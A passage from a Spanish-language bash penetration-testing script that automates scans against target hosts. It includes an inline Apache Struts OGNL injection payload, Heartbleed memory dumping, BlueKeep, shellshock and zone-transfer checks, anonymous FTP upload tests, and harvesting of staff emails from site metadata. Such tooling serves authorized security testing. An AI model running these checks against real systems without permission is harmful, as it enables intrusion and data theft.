							grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Enumerando WAMPSERVER"
								wampServer.pl -url http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_WAMPSERVER.txt &
							fi
							###################################	
							
							#######  hearbleed (dominio) ######						
							echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
							echo "nmap -n -Pn -p $port --script=ssl-heartbleed $subdominio" > logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt 2>/dev/null 
							nmap -n -Pn -p $port --script=ssl-heartbleed $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt 2>/dev/null 
							egrep -qi "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt
							greprc=$?
							if [[ $greprc -eq 0 ]] ; then						
								echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt				
								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$subdominio"_"$port"_heartbleedRAM.txt						
							else							
								echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
							fi
							##########################
						
							#######  clone site (domain) ####### 						
							cd webClone
								echo -e "\t\t[+] Clonando sitio"
								
								if [ -d "$subdominio" ]; then
									echo -e "\t\t[+] Ya clonamos este sitio"
								else
									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio
									rm index.html.orig 2>/dev/null
								fi
								
							cd ..						
							###################################												
						else
								echo -e "\t\t[+] Redirección o error de proxy detectado"	
						fi														
						
					done # subdominios 
			  fi # revisar por dominio
				################################
				
				
				
				################# Comprobar que no haya muchos scripts ejecutandose ########
				while true; do
					free_ram=`free -m | grep -i mem | awk '{print $7}'`		
					perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 	
					if [[ $free_ram -lt $min_ram || $perl_instancias -gt 10  ]];then 
						echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
						sleep 10	
					else		
						break
					fi
				done	
				####################################
				
				
				############### Escaneo por IP ############
				egrep -qi "500 Proxy Error" .enumeracion/"$ip"_"$port"_webData.txt
				greprc=$?	
				if [[ $greprc -eq 1 ]];then # no redirecciona o es error de proxy																
				
					if [ $internet == "s" ]; then 	
						echo -e "\t[+] identificar si el host esta protegido por un WAF "
						wafw00f https://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt
					fi
							
					
					######## heartbleed (IP) ##########
					echo -e "\t[+] Revisando vulnerabilidad heartbleed"
					echo "nmap -n -Pn -p $port --script=ssl-heartbleed $ip" > logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt 2>/dev/null 
					nmap -n -Pn -p $port --script=ssl-heartbleed $ip >> logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt 2>/dev/null 
					egrep -qi "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt
					greprc=$?
					if [[ $greprc -eq 0 ]] ; then						
						echo -e "\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
						grep "|" logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_heartbleed.txt				
						heartbleed.py $ip -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$ip"_"$port"_heartbleedRAM.txt						
					else
						echo -e "\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
					fi
					###################################	
				
					#######  wordpress (IP) ######
					grep -qi wordpress .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 		
						echo -e "\t[+] Revisando vulnerabilidades de wordpress"
						wpscan  --update
						wpscan --url https://$subdominio/ -_enumerate u > .enumeracion/"$subdominio"_"$port"_wpscan.txt &
					fi
					###########################	
				
					#######  joomla (domain) ######
					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 										
						echo -e "\t[+] Revisando vulnerabilidades de joomla"
						joomscan.sh -u https://$ip/ > .enumeracion/"$ip"_"$port"_joomscan.txt &
					fi
					###################################	
				
					#######  WAMPSERVER (ip) ######
					grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 										
						echo -e "\t[+] Enumerando WAMPSERVER"
						wampServer.pl -url https://$ip/ > .enumeracion/"$ip"_"$port"_WAMPSERVER.txt &
					fi
					###################################	
					
																							
					#######  if the server is apache ######
					egrep -i "apache|nginx" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes
						
						echo -e "\t[+] Revisando directorios ( $ip Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2
						echo -e "\t[+] Revisando  paneles administrativos ( $ip Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_admin.txt 
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de servidor ($ip - Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						echo -e "\t[+] Revisando backups de archivos de configuración ($ip - Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						
						egrep -iq "is behind" .enumeracion/"$ip"_"$port"_wafw00f.txt 2>/dev/null
						greprc=$?
						if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
							echo -e "\t[+] Revisando archivos CGI ($ip - Apache/nginx)"
							web-buster.pl -t $ip -p $port -h 2 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
							sleep 2
						fi							
						
						echo -e "\t[+] Revisando archivos peligrosos ($ip - Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  
						sleep 2
						echo -e "\t[+] Revisando la existencia de backdoors ($ip - Apache/nginx)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						sleep 2
						echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip - Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m divulgacionInformacion -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null 
					fi						
					####################################
		
					#######  if the server is IIS ######
					grep -qi IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" 
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
						echo -e "\n### $ip:$port ( IIS - HTTPsys)"
						nmap -n -Pn -p $port --script http_vuln-cve2015-1635 $ip > logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt 2>/dev/null 
						grep "|" logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_HTTPsys.txt 
						
						echo -e "\t[+] Revisando directorios  (IIS)"					
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2
						echo -e "\t[+] Revisando paneles administrativos ($ip - IIS)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_admin.txt 
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de servidor ($ip - IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de sharepoint ($ip - IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de webservices ($ip - IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
						sleep 2
						echo -e "\t[+] Revisando la existencia de backdoors ($ip - IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt 
						sleep 2
						echo -e "\t[+] Revisando backups de archivos de configuración ($ip - IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt 
										
					fi
									
					####################################
				
					#######  if the server is java ######
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found" 
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es JAVA y no se enumero antes				
						echo -e "\t[+] Revisando Apache struts"					
						curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$ip:$port/" > logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt 2>/dev/null
						grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt > .vulnerabilidades/"$ip"_"$port"_apacheStruts.txt																												  
						
						echo -e "\t[+] Revisando directorios  ($ip - tomcat)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de tomcat  ($ip - tomcat)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^401" >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de servidor  ($ip - tomcat)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
						sleep 1						
					fi									
					####################################								
				fi # fin si no hay redireccion http --> https
								
					
				break
			else
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb) ó maximo número de instancias de perl ($perl_instancias) "
				sleep 3
			fi
    	done	# done true					
   done #for


	################# si hay menos de 12 scripts de perl continua el script ##############
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
		if [[ $free_ram -lt $min_ram || $perl_instancias -gt 12  ]];then 
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 10	
		else
			echo "ok"
			break
		fi
	done	
	#################################################################################
		
	#insert clean data	
	insert_data   		
fi

cd webClone
	echo -e "[+] Extrayendo URLs de todos los sitios clonados"
	grep --color=never -irao "http://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
	lines=`wc -l http.txt  | cut -d " " -f1`
	perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
	paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMAIN"_web_wget2.txt
	rm http.txt 2>/dev/null
				
	grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt
	lines=`wc -l https.txt  | cut -d " " -f1`
	perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
	paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMAIN"_web_wget2.txt
	rm https.txt 2>/dev/null
				 
	#grep --color=never -irao "http://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/"$DOMAIN"_web_wget2.txt
	#grep --color=never -irao "https://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/"$DOMAIN"_web_wget2.txt
					
						
	echo -e "[+] Buscando archivos sin extension"
	find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.css -o -iname \*.orig \) > archivos-sin-extension.txt
	contador=1
	mkdir documentos_renombrados 2>/dev/null
	for archivo in `cat archivos-sin-extension.txt`;
	do 		
		tipo_archivo=`file $archivo`
		# tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
		if [[ ${tipo_archivo} == *"PDF"*  ]];then 													
			mv $archivo documentos_renombrados/$contador.pdf 
		fi		
	 
		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
			mv $archivo documentos_renombrados/$contador.doc 
		fi		
		
		if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
			mv $archivo documentos_renombrados/$contador.docx 
		fi		
	 
		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
			mv $archivo documentos_renombrados/$contador.xls 
		fi				 
	 
		if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
			mv $archivo documentos_renombrados/$contador.xlsx 
		fi
	 		 
		if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
			mv $archivo documentos_renombrados/$contador.ppt 
		fi	
	 		 
		if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
			mv $archivo documentos_renombrados/$contador.pptx 
		fi		
	 
		if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
			mv $archivo documentos_renombrados/$contador.rar 
		fi		
		let "contador=contador+1"	 
	done # fin revisar archivos sin extension
	
	#### mover archivos con metadata para extraerlos ########
	echo -e "[+] Extraer metadatos con exiftool"										
	find . -name "*.pdf" -exec mv {} "../archivos" \;
	find . -name "*.xls" -exec mv {} "../archivos" \;
	find . -name "*.doc" -exec mv {} "../archivos" \;
	find . -name "*.ppt" -exec mv {} "../archivos" \;
	find . -name "*.pps" -exec mv {} "../archivos" \;
	find . -name "*.docx" -exec mv {} "../archivos" \;
	find . -name "*.pptx" -exec mv {} "../archivos" \;
	find . -name "*.xlsx" -exec mv {} "../archivos" \;
	
						
	######### buscar IPs privadas
	echo -e "\t\t[+] Revisando si hay divulgación de IPs privadas"	
	grep -ira "192.168." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	grep -ira "172.16." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt						
						
	grep -ira "http://172." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	grep -ira "http://10." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	grep -ira "http://192." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt

	grep -ira "https://172." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	grep -ira "https://10." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	grep -ira "https://192." * >> ../.vulnerabilidades/"$DOMAIN"_web_IPinterna.txt
	###############################	
	
	######### buscar comentarios 
	echo -e "\t\t[+] Revisando si hay comentarios html, JS"	
	grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class" >> ../.enumeracion/"$DOMAIN"_web_comentario.txt
	grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMAIN"_web_comentario.txt
	grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMAIN"_web_comentario.txt
	egrep -i " password | contrase| pin | firma| key | api " ../.enumeracion/"$DOMAIN"_web_comentario.txt > ../.vulnerabilidades/"$DOMAIN"_web_comentario.txt
	###############################						


cd ../	 # salir de webCLone

############################################################################
echo -e "[+] Extraer metadatos de sitios clonados"										
exiftool archivos > logs/enumeracion/"$DOMAIN"_metadata_exiftool.txt
egrep -i "Author|creator" logs/enumeracion/"$DOMAIN"_metadata_exiftool.txt | awk '{print $3}' | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMAIN"_metadata_exiftool.txt

##### Reporte metadatos (sitio web) ##
sed 's/ /-/g' -i .enumeracion/"$DOMAIN"_metadata_exiftool.txt # cambiar espacios por "-"
echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
for nombreCompleto in `more .enumeracion/"$DOMAIN"_metadata_exiftool.txt`; do	
#echo "nombreCompleto $nombreCompleto"
	if [[ ${nombreCompleto} == *"-"*  ]];then 			
		nombre=`echo $nombreCompleto | cut -f1 -d "-"`
		apellido=`echo $nombreCompleto | cut -f2 -d "-"`
		echo "$nombre;$apellido;$apellido@$DOMAIN;n/a" > reportes/correos_metadata.csv 
	fi
done
################

#  Eliminar URLs repetidas (clonacion)
echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
sort logs/enumeracion/"$DOMAIN"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMAIN"_web_wgetURLs.txt
insert_data


# filtrar error de conexion a base de datos y otros errores
egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMAIN"_web_errores.txt

# correos presentes en los sitios web
grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/"$DOMAIN"_web_correos.txt

insert_data
find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
###################



if [ -f .servicios/rdp.txt ]
then
    
    #if [ $rdp == "s" ] ; then	
		#mkdir -p screenshots
		echo -e "$OKBLUE #################### RDP (`wc -l .servicios/rdp.txt`) ######################$RESET"	  
		for line in $(cat .servicios/rdp.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			#nmap -Pn -p $port $ip --script=rdp_enum-encryption > .enumeracion/$ip/rdp.txt 2>/dev/null					
			echo -e "[+] Escaneando $ip:$port"	
			echo -e "\t[+] Revisando vulnerabilidad blueKeep"
			blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_RDPvuln.txt
			grep "VULNERABLE" logs/vulnerabilidades/"$ip"_3389_RDPvuln.txt  > .vulnerabilidades/"$ip"_3389_RDPvuln.txt
			
			echo -e "\t[+] Revisando vulnerabilidad MS12-020"
			nmap -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
			grep "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_3389_ms12020.txt
			
			while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`
				if [ "$free_ram" -gt 300 ]			
				then					
					echo -e "\t [+] Obteniendo Certificado SSL"		
					#rdpscreenshot -o `pwd`/screenshots/ $ip 2>/dev/null			
					get_ssl_cert.py $ip $port 2>/dev/null | grep --color=never "("> .enumeracion/"$ip"_"$port"_cert.txt  &
					sleep 0.2
					break
				else
					python_instancias=`pgrep get_ssl_cert | wc -l`
					echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de python ($python_instancias)"
					sleep 3
				fi
			done	# done true	
			
		done	
	#fi   
	
	# revisar si hay scripts ejecutandose
	while true; do
	webbuster_instancias=`ps aux | egrep 'get_ssl_cert|buster|nmap' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data	 		
fi


find logs -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files



if [ -f .servicios/ftp.txt ]
then
	echo -e "$OKBLUE #################### FTP (`wc -l .servicios/ftp.txt`) ######################$RESET"	    
	touch 68b329da9893e34099c7d8ad5cb9c940.txt # file to test upload
	for line in $(cat .servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Escaneando $ip:$port"		
		#nmap -n -sV -Pn -p $port $ip --script=ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > .enumeracion/"$ip"_ftp_vuln.txt 2>/dev/null &
		echo -e "\t[+] Obtener banner"	
		echo -e "\tLIST" | nc -w 3 $ip $port > .banners/"$ip"_"$port".txt 2>/dev/null 
		
		######## revisar si no es impresora #####		
		egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKGREEN[i] Es una impresora $RESET"
		else					
			egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/"$ip"_23_webData.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKGREEN[i] Es una impresora $RESET"
			else							
				echo -e "\t[+] Comprobando usuario anonymous"
				echo "ftp_anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt" > logs/vulnerabilidades/"$ip"_21_anonymous.txt 2>/dev/null 
				ftp_anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt >> logs/vulnerabilidades/"$ip"_21_anonymous.txt 2>/dev/null 
				grep "Listado de directorio" logs/vulnerabilidades/"$ip"_21_anonymous.txt > .vulnerabilidades/"$ip"_21_anonymous.txt
				sleep 5
			fi
		fi	
		#######################################
		
	done	
	rm 68b329da9893e34099c7d8ad5cb9c940.txt 2>/dev/null

	#insert clean data	
	insert_data
	
fi


if [ -f .servicios/cgi.txt ]
then
        		
		echo -e "$OKBLUE #################### CGI (`wc -l .servicios/cgi.txt`) ######################$RESET"	  
		for line in $(cat .servicios/cgi.txt); do
			ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
			port_path=`echo $line | cut -d ":" -f 3`
			port=`echo $port_path | cut -d "/" -f 1`
			path="/"`echo $port_path | cut -d "/" -f 2-8`
			
			echo -e "[+] Escaneando $ip:$port"	
			echo -e "\t [+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"
				
			echo "nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip" >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
			nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
			grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
			
			if [ -s .vulnerabilidades/"$ip"_"$port"_shellshock.txt ] # if FILE exists and has a size greater than zero.
			then
				echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
				echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
				grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
			else				
				echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
			fi
			
		done
	
	#insert clean data	
	insert_data		 	
fi



if [ -f .servicios/dns.txt ]
then
	echo -e "$OKBLUE #################### DNS (`wc -l .servicios/dns.txt`) ######################$RESET"	  
	for line in $(cat .servicios/dns.txt); do
		ip=`echo $line | cut -f1 -d":"`
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t [+] Probando transferencia de zona"
			
			### zone transfer ###			
			zone_transfer=`dig -tAXFR @$ip $DOMAIN`
			echo "dig -tAXFR @$ip $dominio" > logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
			echo $zone_transfer >> logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
			if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
				echo $zone_transfer > .vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
				echo -e "\t$OKRED[!] Transferencia de zona detectada \n $RESET"
			else
				
				echo -e "\t$OKGREEN[i] No se pudo realizar la transferencia de zona$RESET"
			fi	
			
			#open resolver
			echo -e "\t [+] Probando si es un servidor DNS openresolver"
			dig ANY google.com @$ip +short | grep --color=never google | grep -v "failed" > .vulnerabilidades/"$ip"_53_openresolver.txt 2>/dev/null &																
		
	done
	
	# revisar si hay scripts ejecutandose
	while true; do
	dig_instancias=`ps aux | egrep 'dig' | wc -l`		
	if [ "$dig_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($dig_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	#insert clean data	
	insert_data		
fi


	
## Procesar los usuarios enumerados con smtp-user-enum
if [ -f .servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
		
		# revisar si hay scripts ejecutandose
		echo -e "[+] Verificar si se esta ejecutando smtp-user-enum"
		while true; do
			smtp_user_enum_instancias=`ps aux | egrep 'smtp-user-enum' | wc -l`		
			if [ "$smtp_user_enum_instancias" -gt 1 ]
			then
				echo -e "\t[-] Todavia esta smtp-user-enum activo ($smtp_user_enum_instancias)"				
				sleep 20
			else
				break		
			fi
		done	# done true	


		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`					
			echo -e "[+]  $ip:$port"
			egrep -iq "User unknown" logs/vulnerabilidades/"$ip"_"$port"_vrfy.txt 2>/dev/null
			greprc=$?
